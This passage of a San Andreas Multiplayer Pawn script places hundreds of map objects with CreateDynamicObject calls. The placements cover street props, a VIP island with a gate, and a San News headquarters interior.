	CreateDynamicObject(970,1810.30004883,-1882.19995117,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (32)
	CreateDynamicObject(1216,1761.50000000,-1884.00000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(phonebooth1) (1)
	CreateDynamicObject(1216,1762.90002441,-1884.00000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(phonebooth1) (2)
	CreateDynamicObject(1216,1765.59997559,-1884.00000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(phonebooth1) (3)
	CreateDynamicObject(1216,1764.30004883,-1884.00000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(phonebooth1) (4)
	CreateDynamicObject(1223,1752.30004883,-1900.59997559,12.60000038,0.00000000,0.00000000,0.00000000); //object(lampost_coast) (1)
	CreateDynamicObject(1223,1752.30004883,-1905.19995117,12.60000038,0.00000000,0.00000000,0.00000000); //object(lampost_coast) (2)
	CreateDynamicObject(1223,1752.30004883,-1896.40002441,12.60000038,0.00000000,0.00000000,0.00000000); //object(lampost_coast) (3)
	CreateDynamicObject(1223,1752.30004883,-1891.90002441,12.60000038,0.00000000,0.00000000,0.00000000); //object(lampost_coast) (4)
	CreateDynamicObject(1257,1797.50000000,-1861.09997559,13.89999962,0.00000000,0.00000000,270.00000000); //object(bustopm) (1)
	CreateDynamicObject(1340,1757.09997559,-1886.19995117,13.69999981,0.00000000,0.00000000,348.00000000); //object(chillidogcart) (1)
	CreateDynamicObject(1341,1813.69995117,-1882.00000000,13.60000038,0.00000000,0.00000000,300.00000000); //object(icescart_prop) (1)
	CreateDynamicObject(1342,1754.50000000,-1889.50000000,13.60000038,0.00000000,0.00000000,308.00000000); //object(noodlecart_prop) (1)
	CreateDynamicObject(1346,1800.59997559,-1861.00000000,13.89999962,0.00000000,0.00000000,90.00000000); //object(cj_phone_kiosk2) (1)
	CreateDynamicObject(1366,1781.00000000,-1942.09997559,13.19999981,0.00000000,0.00000000,0.00000000); //object(cj_firehydrant) (1)
	CreateDynamicObject(6289,1797.00000000,-1920.19995117,15.00000000,0.00000000,0.00000000,0.00000000); //object(pier03b_law2) (1)
	CreateDynamicObject(970,1801.00000000,-1935.59997559,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (33)

	//vip island map
	CreateDynamicObject(3488, 3094.4, -1062.8, 14.0, 0.0, 0.0, 90.4);
	CreateDynamicObject(3486, 3094.4, -1037.2, 14.5, 0.0, 0.0, 90.2);
	CreateDynamicObject(3483, 3191.5, -1111.3, 14.5, 0.0, 0.0, -91.2);
	CreateDynamicObject(3485, 3192.2, -1081.1, 14.5, 0.0, 0.0, -91.2);
	CreateDynamicObject(3484, 3192.6, -1051.0, 14.2, 0.0, 0.0, -90.9);
	CreateDynamicObject(3487, 3192.7, -1025.5, 14.2, 0.0, 0.0, -91.1);
	CreateDynamicObject(1597, 3081.7, -1083.7, 10.1, 0.0, 0.0, 179.9);
	CreateDynamicObject(1597, 3081.3, -1101.5, 10.1, 0.0, 0.0, 0.0);
	CreateDynamicObject(1364, 3077.9, -1099.6, 8.4, 0.0, 0.0, 179.2);
	CreateDynamicObject(1364, 3078.0, -1085.6, 8.4, 0.0, 0.0, -0.3);
	CreateDynamicObject(7952, 3123.8, -1126.6, 8.1, 0.0, 0.0, 89.0);
	CreateDynamicObject(7952, 3113.2, -1126.4, 8.1, 0.0, 0.0, 89.0);
	CreateDynamicObject(19121, 3081.5, -1097.2, 8.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(19121, 3081.5, -1088.2, 8.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1496, 2161.9, -1742.4, 12.4, 0.0, 0.0, 0.0);
	CreateDynamicObject(18762, 1330.1, -1144.7, 23.4, 0.0, -89.6, 0.0);
	CreateDynamicObject(1506, -383.3, -1439.6, 25.3, 0.0, 0.0, 88.9);
	CreateDynamicObject(1506, -391.6, -1439.9, 25.3, 0.0, 0.0, 88.7);
	CreateDynamicObject(16133, 3188.4, -993.0, -0.3, 0.0, 0.0, -92.2);
	CreateDynamicObject(16133, 3218.4, -1009.8, -0.3, 0.0, -0.0, 171.8);
	CreateDynamicObject(16133, 3218.4, -1056.9, -0.3, 0.0, -0.0, 171.8);
	CreateDynamicObject(16133, 3218.4, -1092.1, -0.3, 0.0, -0.0, 168.4);
	CreateDynamicObject(3483, 3094.3, -1006.9, 14.5, 0.0, 0.0, 89.9);
	CreateDynamicObject(2114, 3200.4, -1001.8, 7.7, 0.2, 0.2, -90.3);
	CreateDynamicObject(3928, 3140.0, -1117.0, 7.6, 0.0, -0.0, -90.9);
	CreateDynamicObject(3928, 3151.5, -1117.1, 7.5, 0.0, -0.0, -90.9);
	CreateDynamicObject(2114, 3200.9, -1001.8, 7.7, 0.2, 0.2, -90.3);
	CreateDynamicObject(1316, 3200.4, -1001.8, 7.6, 0.0, 0.0, 0.0);
	CreateDynamicObject(5812, 3143.3, -1051.7, 7.8, -0.0, -0.1, 0.0);
	CreateDynamicObject(640, 3130.2, -1102.7, 8.2, 0.0, 0.0, 90.8);
	CreateDynamicObject(2114, 3199.9, -1001.8, 7.7, 0.2, 0.2, -90.3);
	CreateDynamicObject(1232, 3207.9, -1003.7, 8.4, 0.0, 0.0, 0.0);
	CreateDynamicObject(1232, 3207.9, -1011.6, 8.4, 0.0, 0.0, 0.0);
	CreateDynamicObject(638, 3203.1, -1002.2, 8.1, 0.0, 0.0, -97.9);
	CreateDynamicObject(638, 3197.6, -1001.4, 8.1, 0.0, 0.0, -97.9);
	CreateDynamicObject(19313, 3202.5, -1015.2, 9.2, 0.0, 0.0, -0.9);
	CreateDynamicObject(3496, 3208.0, -1007.5, 7.5, 0.0, 0.0, 87.5);
	CreateDynamicObject(1280, 3203.7, -1014.7, 7.8, 0.0, 0.0, -90.4);
	CreateDynamicObject(1280, 3199.3, -1014.7, 7.8, 0.0, 0.0, -90.4);
	CreateDynamicObject(1549, 3201.5, -1014.6, 7.4, 0.0, 0.0, 0.0);
	CreateDynamicObject(2010, 3197.4, -1014.7, 7.5, 0.0, 0.0, 0.0);
	CreateDynamicObject(2010, 3205.6, -1014.7, 7.5, 0.0, 0.0, 0.0);
	CreateDynamicObject(3660, 3156.8, -1050.7, 9.1, 0.0, 0.0, -89.5);
	CreateDynamicObject(3660, 3157.0, -1069.9, 9.1, 0.0, 0.0, -89.5);
	CreateDynamicObject(3660, 3156.6, -1031.6, 9.1, 0.0, 0.0, -89.5);
	CreateDynamicObject(3660, 3130.2, -1031.8, 9.1, 0.0, 0.0, -91.4);
	CreateDynamicObject(3660, 3130.1, -1050.9, 9.1, 0.0, 0.0, -90.2);
	CreateDynamicObject(3660, 3129.7, -1070.0, 9.1, 0.0, 0.0, -90.2);
	CreateDynamicObject(1280, 3155.1, -1023.1, 8.0, 0.0, 0.0, 0.6);
	CreateDynamicObject(1280, 3155.2, -1032.3, 8.0, 0.0, 0.0, 0.6);
	CreateDynamicObject(1280, 3155.3, -1043.2, 8.0, 0.0, 0.0, -1.5);
	CreateDynamicObject(1280, 3155.4, -1051.7, 8.1, 0.0, 0.0, -0.5);
	CreateDynamicObject(1280, 3155.7, -1063.1, 8.1, 0.0, 0.0, 0.9);
	CreateDynamicObject(1280, 3155.8, -1070.8, 8.1, 0.0, 0.0, 0.1);
	CreateDynamicObject(1280, 3131.4, -1023.4, 8.0, 0.0, 0.0, 178.1);
	CreateDynamicObject(1280, 3131.1, -1032.2, 8.0, 0.0, 0.0, 178.1);
	CreateDynamicObject(1280, 3130.9, -1042.6, 8.1, 0.0, 0.0, -179.9);
	CreateDynamicObject(1280, 3130.6, -1051.5, 8.1, 0.0, 0.0, 179.8);
	CreateDynamicObject(1280, 3130.7, -1063.5, 8.1, 0.3, 0.0, 179.7);
	CreateDynamicObject(1280, 3130.8, -1070.9, 8.1, 0.0, 0.0, -179.8);
	CreateDynamicObject(8991, 3148.5, -1070.7, 8.7, 0.0, 0.0, -89.0);
	CreateDynamicObject(8991, 3147.8, -1070.7, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3147.2, -1070.7, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3146.6, -1070.7, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3145.9, -1070.6, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3145.4, -1070.6, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3144.8, -1070.6, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3144.4, -1070.6, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3143.7, -1070.6, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3143.2, -1070.5, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3142.5, -1070.5, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3141.8, -1070.5, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3141.2, -1070.5, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3140.6, -1070.4, 8.7, 0.0, 0.0, -92.2);
	CreateDynamicObject(8991, 3140.0, -1070.4, 8.7, 0.0, 0.0, -89.6);
	CreateDynamicObject(9833, 3143.5, -1052.8, 10.5, 0.0, 0.0, 31.3);
	CreateDynamicObject(8991, 3148.3, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3147.8, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3147.1, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3146.5, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3145.8, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3145.3, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3144.7, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3144.0, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3143.3, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3142.7, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3142.1, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3141.4, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3140.7, -1033.6, 8.6, 0.0, 0.0, -90.0);
	CreateDynamicObject(8991, 3140.0, -1033.6, 8.6, 0.0, 0.0, -88.7);
	CreateDynamicObject(878, 3144.2, -1046.2, 8.8, 0.0, 0.0, 0.0);
	CreateDynamicObject(878, 3145.0, -1056.6, 8.8, 0.0, 0.0, -175.8);
	CreateDynamicObject(878, 3145.0, -1058.8, 8.8, 0.0, 0.0, -8.3);
	CreateDynamicObject(878, 3143.9, -1043.2, 8.8, 0.0, 0.0, 177.5);
	CreateDynamicObject(707, 3139.0, -1089.9, 7.5, 0.0, 0.0, -12.6);
	CreateDynamicObject(706, 3154.1, -1087.2, 7.3, 0.0, 0.0, 28.8);
	CreateDynamicObject(707, 3136.6, -1011.0, 6.9, 0.0, 0.0, 68.0);
	CreateDynamicObject(706, 3152.3, -1013.4, 6.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(3496, 3183.1, -1006.8, 7.5, 0.0, 0.0, -91.3);
	CreateDynamicObject(19313, 3188.5, -1015.0, 9.2, 0.0, 0.0, -0.9);
	CreateDynamicObject(19313, 3182.8, -1004.7, 9.2, 0.0, 0.0, 83.5);
	CreateDynamicObject(1280, 3194.9, -1014.6, 7.8, 0.0, 0.0, -90.4);
	CreateDynamicObject(1280, 3189.8, -1014.6, 7.8, 0.0, 0.0, -90.4);
	CreateDynamicObject(1568, 3176.0, -1018.1, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1232, 3183.7, -1003.7, 8.4, 0.0, 0.0, 0.0);
	CreateDynamicObject(1372, 3176.7, -1126.7, 7.6, 0.0, 0.0, 0.0);
	CreateDynamicObject(1344, 3179.0, -1126.7, 8.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1332, 3181.8, -1127.0, 8.5, 0.0, 0.0, 174.9);
	CreateDynamicObject(1236, 3188.1, -1127.3, 8.1, 0.0, 0.0, 0.0);
	CreateDynamicObject(1415, 3185.1, -1127.0, 7.6, 0.0, 0.0, 0.0);
	CreateDynamicObject(1462, 3173.7, -1124.8, 7.5, 0.0, 0.0, -91.0);
	CreateDynamicObject(14600, 3190.1, -1133.0, 8.6, 0.0, 0.0, -89.9);
	CreateDynamicObject(16133, 3187.9, -1141.7, 1.1, 0.0, -0.0, 77.2);
	CreateDynamicObject(2010, 3188.1, -1014.7, 7.5, 0.0, 0.0, 0.0);
	CreateDynamicObject(1549, 3192.1, -1014.6, 7.4, 0.0, 0.0, 0.0);
	CreateDynamicObject(1232, 3182.3, -1011.6, 8.4, 0.0, 0.0, 0.0);
	CreateDynamicObject(1568, 3175.7, -1033.2, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1568, 3176.4, -1042.2, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1568, 3175.4, -1063.1, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1568, 3176.0, -1087.6, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1568, 3175.1, -1093.9, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1568, 3174.8, -1109.1, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1568, 3174.5, -1119.0, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(640, 3086.2, -1103.3, 8.2, 0.0, 0.0, 90.8);
	CreateDynamicObject(1568, 3111.3, -1055.4, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1215, 3082.9, -1103.3, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(640, 3092.6, -1103.2, 8.2, 0.0, 0.0, 90.8);
	CreateDynamicObject(640, 3099.0, -1103.1, 8.2, 0.0, 0.0, 90.8);
	CreateDynamicObject(1215, 3089.3, -1103.3, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(1568, 3111.3, -1070.7, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1215, 3102.2, -1103.0, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(1568, 3111.3, -1050.6, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1568, 3111.2, -1022.7, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1568, 3111.2, -1008.7, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1568, 3111.2, -998.9, 7.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(1223, 3130.4, -1072.4, 7.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(1223, 3155.3, -1041.5, 7.3, 0.0, 0.0, 179.0);
	CreateDynamicObject(1223, 3130.4, -1061.8, 7.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(1223, 3130.4, -1053.0, 7.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(1223, 3130.8, -1040.8, 7.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(1223, 3131.0, -1033.6, 7.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(1223, 3131.3, -1021.5, 7.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(1223, 3155.6, -1061.5, 7.3, 0.0, 0.0, 179.0);
	CreateDynamicObject(1215, 3095.7, -1103.3, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(1223, 3155.6, -1072.4, 7.3, 0.0, 0.0, 179.0);
	CreateDynamicObject(1215, 3108.2, -1103.0, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(1223, 3155.1, -1033.9, 7.3, 0.0, 0.0, 179.0);
	CreateDynamicObject(1223, 3155.2, -1021.5, 7.2, 0.0, 0.0, 179.0);
	CreateDynamicObject(640, 3111.3, -1102.9, 8.2, 0.0, 0.0, 90.8);
	CreateDynamicObject(640, 3117.7, -1102.8, 8.2, 0.0, 0.0, 90.8);
	CreateDynamicObject(1215, 3114.5, -1103.0, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(640, 3124.0, -1102.7, 8.2, 0.0, 0.0, 90.8);
	CreateDynamicObject(1215, 3120.9, -1102.8, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(1215, 3127.1, -1103.0, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(1215, 3132.4, -1103.6, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(640, 3132.6, -1106.8, 8.2, 0.0, 0.0, -179.9);
	CreateDynamicObject(3861, 3141.6, -1088.0, 8.9, 0.0, 0.0, 177.6);
	CreateDynamicObject(1215, 3132.6, -1110.2, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(640, 3132.6, -1113.4, 8.2, 0.0, 0.0, -179.9);
	CreateDynamicObject(1215, 3132.6, -1116.8, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(3861, 3146.2, -1088.2, 8.9, 0.0, 0.0, 177.6);
	CreateDynamicObject(3861, 3134.0, -1083.2, 8.9, 0.0, 0.0, 137.6);
	CreateDynamicObject(3861, 3153.7, -1081.7, 8.9, 0.0, 0.0, -136.4);
	CreateDynamicObject(640, 3132.6, -1120.0, 8.2, 0.0, 0.0, -179.9);
	CreateDynamicObject(1215, 3132.6, -1123.4, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(1215, 3132.6, -1124.7, 7.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(1570, 3141.2, -1015.5, 8.8, 0.0, 0.0, 0.0);
	CreateDynamicObject(970, 3078.5, -1124.7, 8.1, 0.0, 0.0, -1.2);
	CreateDynamicObject(970, 3087.3, -1124.9, 8.1, 0.0, 0.0, -1.2);
	CreateDynamicObject(1570, 3145.6, -1015.5, 8.8, 0.0, 0.0, 0.0);
	CreateDynamicObject(970, 3082.9, -1124.8, 8.1, 0.0, 0.0, -1.2);
	CreateDynamicObject(970, 3091.8, -1125.0, 8.1, 0.0, 0.0, -1.2);
	CreateDynamicObject(970, 3096.1, -1125.0, 8.1, 0.0, 0.0, -1.0);
	CreateDynamicObject(970, 3100.6, -1125.1, 8.1, 0.0, 0.0, -1.2);
	CreateDynamicObject(970, 3105.0, -1125.2, 8.1, 0.0, 0.0, -1.2);
	CreateDynamicObject(970, 3109.4, -1125.3, 8.1, 0.0, 0.0, -1.2);
	CreateDynamicObject(970, 3113.9, -1125.4, 8.1, 0.0, 0.0, -1.2);
	CreateDynamicObject(970, 3118.5, -1125.4, 8.1, 0.0, 0.0, -1.2);
	CreateDynamicObject(970, 3122.9, -1125.5, 8.1, 0.0, 0.0, -1.2);
	CreateDynamicObject(18762, 1307.5, -1144.7, 23.4, 0.0, -89.6, 0.0);
	CreateDynamicObject(970, 3127.4, -1125.6, 8.1, 0.0, 0.0, -1.2);
	CreateDynamicObject(970, 3129.5, -1125.6, 8.1, 0.0, 0.0, -1.2);
	CreateDynamicObject(1346, 3075.9, -1120.2, 8.8, 0.0, 0.0, 89.1);
	CreateDynamicObject(1346, 3076.0, -1117.7, 8.8, 0.0, 0.0, 89.1);
	CreateDynamicObject(970, -2521.4, -1710.2, 401.8, 0.0, 0.0, 0.0);
	CreateDynamicObject(970, -2531.4, -1692.1, 400.7, 0.0, 0.0, -74.8);
	CreateDynamicObject(970, -2589.8, -1621.5, 343.5, 0.0, 0.0, 0.0);
	CreateDynamicObject(970, -2444.8, -2082.5, 124.7, 0.0, 11.5, -16.7);
	CreateDynamicObject(970, -2442.5, -2086.9, 124.3, 0.0, 0.0, 82.7);
	CreateDynamicObject(970, -2099.7, -1879.7, 110.0, 0.0, 0.0, -34.1);
	CreateDynamicObject(6056, -2291.6, -1678.8, 486.8, 0.0, 0.0, 130.8);
	CreateDynamicObject(970, -2299.0, -1668.6, 483.1, 0.0, 0.0, -62.2);
	CreateDynamicObject(970, -2304.2, -1671.3, 483.1, 0.0, 0.0, -62.2);
	CreateDynamicObject(970, -2304.7, -1657.8, 483.1, 0.0, 0.0, -62.2);
	CreateDynamicObject(970, -2309.7, -1661.0, 483.1, 0.0, 0.0, -62.2);
	CreateDynamicObject(18762, 1325.1, -1144.7, 23.4, 0.0, -89.6, 0.0);
	CreateDynamicObject(18762, 1321.3, -1144.7, 23.4, 0.0, -89.6, 0.0);
	CreateDynamicObject(18762, 1316.4, -1144.7, 23.4, 0.0, -89.6, 0.0);
	CreateDynamicObject(18762, 1311.5, -1144.7, 23.4, 0.0, -89.6, 0.0);
	CreateDynamicObject(1225, 2359.9, -1678.3, 138.0, 0.0, 0.0, 0.0);
	CreateDynamicObject(16152, 1271.0, -1679.3, 18.5, 0.0, 0.0, 0.0);
	CreateDynamicObject(16152, 1277.9, -1677.2, 18.6, 0.0, 0.0, 179.8);
	CreateDynamicObject(1331, 1277.0, -1693.8, 19.5, 0.0, 0.0, 178.4);
	CreateDynamicObject(1331, 1272.8, -1693.7, 19.5, 0.0, 0.0, 178.4);
	CreateDynamicObject(1462, 1275.1, -1694.1, 18.6, 0.0, 0.0, 179.5);
	CreateDynamicObject(1359, 1271.1, -1672.9, 19.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(1359, 1277.9, -1683.8, 19.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(638, 1278.1, -1672.2, 19.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(638, 1278.1, -1669.1, 19.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(638, 1278.1, -1665.9, 19.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(638, 1278.1, -1685.9, 19.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(638, 1278.1, -1688.9, 19.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(638, 1278.1, -1691.9, 19.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(638, 1270.7, -1688.2, 19.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(638, 1270.7, -1685.0, 19.3, 0.0, 0.0, 0.0);
	CreateDynamicObject(1331, 1276.5, -1693.8, 19.5, 0.0, 0.0, 178.4);
	CreateDynamicObject(3471, 1277.9, -1663.4, 19.7, 0.0, 0.0, -91.2);
	CreateDynamicObject(3471, 1271.5, -1663.3, 19.7, 0.0, 0.0, -91.2);
	CreateDynamicObject(1364, 1270.4, -1667.9, 19.3, 0.0, 0.0, 91.0);
	CreateDynamicObject(2773, 1269.7, -1690.2, 19.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(2773, 1269.7, -1693.8, 19.2, 0.0, 0.0, 0.0);
	CreateDynamicObject(643, 1268.5, -1696.3, 12.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(643, 1264.8, -1696.3, 12.9, 0.0, 0.0, -125.8);
	CreateDynamicObject(643, 1261.2, -1696.4, 12.9, 0.0, -2.6, -88.1);
	CreateDynamicObject(970, 1257.7, -1697.8, 13.0, 0.0, 0.0, -88.6);
	CreateDynamicObject(970, 1270.5, -1697.8, 13.0, 0.0, 0.0, -88.6);
	CreateDynamicObject(970, 1259.8, -1699.9, 13.0, 0.0, 0.0, -0.3);
	CreateDynamicObject(970, 1268.5, -1699.9, 13.0, 0.0, 0.0, -0.3);
	CreateDynamicObject(2010, 1266.1, -1699.9, 12.5, 0.0, 0.0, 0.0);
	CreateDynamicObject(2010, 1262.2, -1699.9, 12.5, 0.0, 0.0, 0.0);
	CreateDynamicObject(1215, 1257.9, -1699.6, 12.8, 0.0, 0.0, 0.0);
	CreateDynamicObject(1215, 1270.4, -1699.6, 12.8, 0.0, 0.0, 0.0);
	CreateDynamicObject(1775, 1272.0, -1695.6, 13.5, 0.0, 0.0, 0.0);
	CreateDynamicObject(1776, 1273.9, -1695.6, 13.5, 0.0, 0.0, 0.0);
	CreateDynamicObject(910, 1277.9, -1695.6, 13.5, 0.0, 0.0, 0.0);
	CreateDynamicObject(19447, -2167.7, 646.9, 1052.6, 0.0, 0.0, -91.0);
	CreateDynamicObject(19447, -2167.7, 646.9, 1055.1, 0.0, 0.0, -91.0);

	//vip gate
	vipgate = CreateDynamicObject(980, 3071.159179, -1092.963378, 10.391244, -0.400000, -0.300000, 91.900016);

	//san news hq
	CreateDynamicObject(14563, 519.602966, -2.869498, 1015.017456, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(7495, 506.132904, -9.723217, 1009.595886, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(7495, 499.198364, -15.836764, 1009.595886, 0.000000, 0.000000, -91.000000);
	CreateDynamicObject(7495, 486.737274, -8.803335, 1009.595886, 0.000000, 0.000000, -181.000000);
	CreateDynamicObject(7495, 493.598327, -2.895019, 1009.595886, 0.000000, 0.000000, -270.000000);
	CreateDynamicObject(1504, 506.121765, -12.917729, 1006.447937, 0.000000, 0.000000, 271.025817);
	CreateDynamicObject(5763, 489.557098, -2.190834, 1048.793579, 179.500000, 0.000000, -180.000000);
	CreateDynamicObject(8185, 498.599975, 78.012718, 1008.533081, 0.000000, 0.000000, -1.263228);
	CreateDynamicObject(1502, 496.563934, -12.146944, 1006.410095, 0.000000, 0.000000, 267.461730);
	CreateDynamicObject(3851, 496.557556, -13.001791, 1010.916992, 0.000000, 0.000000, 358.063659);
	CreateDynamicObject(3851, 496.340118, -19.361585, 1006.946105, 0.000000, 0.000000, 358.063659);
	CreateDynamicObject(3851, 496.344635, -19.323669, 1006.946105, 0.000000, 0.000000, 358.063659);
	CreateDynamicObject(8185, 588.523742, -10.668395, 1008.195068, -0.254999, 0.000000, -89.744911);
	CreateDynamicObject(1494, 498.320892, -11.039566, 1006.477233, 0.000000, 0.000000, 179.016265);
	CreateDynamicObject(3851, 502.461059, -11.156391, 1010.974914, 0.000000, 0.000000, 269.275146);
	CreateDynamicObject(16151, 501.368438, -4.069180, 1006.820068, 0.000000, 0.000000, 90.287040);
	CreateDynamicObject(2561, 500.870117, -3.252151, 1008.517211, 0.000000, 0.000000, 360.158905);
	CreateDynamicObject(1433, 503.374237, -8.269289, 1006.651733, 0.000000, 0.000000, 179.918426);
	CreateDynamicObject(1705, 505.153686, -7.747642, 1006.412841, 0.000000, 0.000000, 270.472045);
	CreateDynamicObject(1705, 503.857116, -10.059904, 1006.406799, 0.000000, 0.000000, 180.230712);
	CreateDynamicObject(1518, 499.225341, -3.302015, 1008.629638, 0.000000, 0.000000, 37.373146);
	CreateDynamicObject(1209, 497.146362, -7.568747, 1006.490417, 0.000000, 0.000000, 88.086265);
	CreateDynamicObject(1486, 503.189453, -8.450460, 1007.296264, 0.000000, 0.000000, 252.635269);
	CreateDynamicObject(1510, 503.582489, -8.375343, 1007.165466, 0.000000, 0.000000, 255.214416);
	CreateDynamicObject(1210, 503.428192, -7.994912, 1007.260131, 90.599945, 1.299998, 230.581237);
	CreateDynamicObject(1668, 503.795806, -8.328186, 1007.325500, 0.000000, 0.000000, 241.331863);
	CreateDynamicObject(1546, 503.637542, -5.167150, 1007.516967, 0.000000, 0.000000, 330.006011);
	CreateDynamicObject(1667, 503.711090, -8.631999, 1007.248046, 0.000000, 0.000000, 231.618377);
	CreateDynamicObject(1742, 506.254455, -6.642158, 1006.459594, 0.000000, 0.000000, 269.615386);
	CreateDynamicObject(1780, 502.650024, -2.968250, 1007.410949, 0.000000, 0.000000, 360.001617);
	CreateDynamicObject(1278, 509.012359, -3.208745, 1000.679687, 0.000000, 0.000000, 268.391113);
	CreateDynamicObject(1278, 490.079895, -0.040683, 1007.486206, 0.000000, 0.000000, 2.637001);
	CreateDynamicObject(1278, 497.009155, -1.258720, 1007.486206, 0.000000, 0.000000, 355.430267);
	CreateDynamicObject(2024, 494.490692, -4.473875, 1006.469482, 0.000000, 0.000000, 268.675659);
	CreateDynamicObject(14391, 491.358276, -11.371994, 1007.486206, 0.000000, 0.000000, 358.349884);
	CreateDynamicObject(2834, 494.504089, -4.482818, 1006.484252, 0.000000, 0.000000, 267.988861);
	CreateDynamicObject(2344, 494.810485, -5.151916, 1007.012817, 0.000000, 0.000000, 307.541656);
	CreateDynamicObject(2104, 491.433105, -14.926501, 1006.456665, 0.000000, 0.000000, 113.000015);
	CreateDynamicObject(1808, 503.244903, -15.707901, 1006.472473, 0.000000, 0.000000, 179.771545);
	CreateDynamicObject(14527, 501.784149, -7.558298, 1008.202636, 0.000000, 0.000000, 272.062347);
	CreateDynamicObject(2291, 496.022613, -8.403697, 1006.478881, 0.000000, 0.000000, 269.376739);
	CreateDynamicObject(2292, 496.054809, -7.934576, 1006.477172, 0.000000, 0.000000, 267.833435);
	CreateDynamicObject(2291, 496.016937, -9.355522, 1006.485412, 0.000000, 0.000000, 269.701354);
	CreateDynamicObject(2291, 496.017822, -10.290102, 1006.485412, 0.000000, 0.000000, 269.701354);
	CreateDynamicObject(2292, 496.006896, -11.723744, 1006.489257, 0.000000, 0.000000, 179.772964);
	CreateDynamicObject(1663, 493.516998, -12.434322, 1006.914489, 0.000000, 0.000000, 246.587020);
	CreateDynamicObject(1663, 493.450469, -11.069184, 1006.914489, 0.000000, 0.000000, 289.587036);
	CreateDynamicObject(1663, 493.514953, -9.304610, 1006.914489, 0.000000, 0.000000, 270.587036);
	CreateDynamicObject(4099, 475.931884, 1.085324, 1008.227905, 0.000000, 0.000000, 95.819686);
	CreateDynamicObject(4099, 477.376007, 1.078819, 1010.813537, 0.000000, 0.000000, 96.119705);
	CreateDynamicObject(1499, 490.480621, -8.436485, 1006.463256, 0.000000, 0.000000, 179.547531);
